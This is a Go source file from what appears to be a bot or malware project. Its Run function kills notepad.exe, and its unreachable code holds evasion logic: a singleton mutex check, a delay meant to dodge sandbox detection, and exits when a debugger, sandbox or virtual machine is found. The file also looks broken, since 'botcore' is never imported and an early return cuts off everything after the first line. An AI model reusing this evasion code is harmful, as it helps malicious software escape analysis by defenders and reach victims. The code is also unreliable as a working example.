package components

import (
	"os"
	"time"
)

func Run() {
	kill("notepad.exe")
	return
	// Check singleton
	if is_already_exist(botcore.mutex_name) {
		os.Exit(0)
	}

	// Sleep for avoiding the detection of sandbox
	time.Sleep(time.Second * time.Duration(botcore.delay))

	// Try to fuck them all
	if botcore.anti_debug && is_debugger_exist() {
		return
	}

	if botcore.anti_sandbox && in_sandbox_now() {
		return
	}

	if botcore.anti_vm && in_vm_now() {
		return
	}

}
